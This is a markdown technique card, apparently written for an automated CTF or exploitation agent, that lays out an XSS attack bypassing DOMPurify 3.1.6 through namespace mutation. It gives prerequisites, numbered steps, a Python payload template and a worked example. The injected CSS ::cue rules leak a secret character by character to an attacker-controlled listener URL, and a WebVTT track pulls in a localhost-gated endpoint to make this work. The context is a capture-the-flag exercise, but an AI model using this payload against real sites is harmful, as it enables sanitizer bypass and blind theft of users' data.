---
name: dompurify_namespace_mutation_css_cue_webvtt_blind_exfil
vuln_type: xss
sub_technique: dompurify_namespace_css_cue
category: exploitation
safety_level: cautious
tags:
- dompurify
- namespace
- webvtt
- css-injection
- blind
- bot
- cue
---

# Dompurify 3.X Namespace Mutation + Css ::Cue(Voice) Blind Exfil Via Webvtt <Track>

## When to Apply

DOMPurify 3.1.6 is used to sanitize HTML that is injected into a <video> element's innerHTML. The `<svg><x:foreignObject>` pattern causes namespace-based mutation: the inner HTML (including <style>) survives sanitization. A <track> element loading a localhost endpoint as WebVTT enables CSS ::cue(v[voice^=...]) attribute matching, creating a character-by-character blind oracle.

## Prerequisites

- DOMPurify 3.1.6 with namespace mutation bug
- Target element is <video> with innerHTML injection
- Bot visits attacker-controlled URL on localhost origin
- Endpoint returns user-controlled text (IP-gated to 127.0.0.1)
- Attacker has a public HTTP listener for callback

## Steps

1. Craft `/review?text=WEBVTT\n\n00:00.000 --> 00:59.000\n<v` so the response becomes valid WebVTT with `<v {FLAG}` as voice cue.
2. Build XSS payload: `<svg><x:foreignObject><p><style>` with CSS rules like `#videoEl::cue(v[voice^='prefix']){background:url(http://LISTENER/m?i=N)}`.
3. Append `<track src='/review?text=...' default kind='captions'>` to load the WebVTT.
4. Submit via `/report` so the bot renders the page.
5. Listener receives callback for the matching character. Extend prefix and repeat.
6. Stop when `}` is recovered.

## Code Template

```
xss = ('<svg><x:foreignObject><p><style>'
       + ''.join(f'#videoEl::cue(v[voice^=\'{prefix}{ch}\'])'
                 f'{{background:url({listener}/m?tok={tok}&i={i})}}'
                 for i, ch in enumerate(charset))
       + '</style></p></x:foreignObject></svg>'
       + f'<track src=\'/review?text={vtt_encoded}\' default kind=\'captions\'>')
```

## Examples

### Example 1

- **dompurify_version**: 3.1.6
- **target_element**: video#videoEl
- **oracle_endpoint**: /review?text=... (IP-gated 127.0.0.1)
- **blind_charset**: printable ASCII (33-126)

Each round recovers one character. Total ~78 rounds for a typical flag. The namespace mutation `<x:foreignObject>` is key — DOMPurify strips the foreign element but its children (<style>) survive and execute in HTML context.
